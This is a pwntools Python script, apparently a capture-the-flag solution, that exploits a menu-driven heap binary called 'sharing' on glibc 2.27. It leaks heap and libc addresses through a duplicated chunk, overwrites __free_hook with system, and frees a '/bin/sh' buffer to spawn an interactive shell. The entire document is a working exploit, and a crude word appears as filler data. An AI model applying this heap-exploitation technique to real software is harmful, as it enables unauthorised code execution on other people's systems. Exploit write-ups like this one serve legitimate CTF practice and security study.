from pwn import *

context.terminal = ["tmux", "new-window"]
#context.log_level = True

is_remote = False
remote_addr = ['',0]

elf_path = "./sharing"
libc_path = "/lib/x86_64-linux-gnu/libc-2.27.so"

if is_remote:
    p = remote(remote_addr[0], remote_addr[1])
else:
    p = process(elf_path, aslr = True)

if elf_path:
    elf = ELF(elf_path)
if libc_path:
    libc = ELF(libc_path)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s, addr = None):
    if addr != None:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a = 6):
    if(a == 6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(i):
    sla(": ", str(i))

def add(idx, siz):
    choice(1)
    choice(idx)
    choice(siz)

def show(idx):
    choice(3)
    choice(idx)

def edit(idx, content):
    choice(4)
    choice(idx)
    sa("Content: ", content)

def dup(source, dst):
    choice(2)
    choice(source)
    choice(dst)

if __name__ == "__main__":
    for i in range(20):
        add(i, 0x100)
    for i in range(20):
        dup(21, i)
    add(0, 0x500)
    show(0)

    rv(8 * 3)
    heap_addr = u64(rv(8)) - 0x160
    lg("Heap", heap_addr)
    rv(8 * 2)
    libc_addr = u64(rv(8)) - 0x3ebca0
    lg("libc", libc_addr)
    libc.address = libc_addr
    ru("Choice")
    dup(21, i)
    add(0, 0x100)
    add(1, 0x100)
    edit(0, "/bin/sh\x00")
    edit(1, "fuckyou")
    choice(0xdead)
    choice("C++isreallyCool!")
    choice(heap_addr)
    show(1)
    content = rv(0x128)
    edit(1, content + p64(libc.symbols['__free_hook']))
    edit(1, p64(libc.symbols['system']))
    dup(21, 0)

    p.interactive()
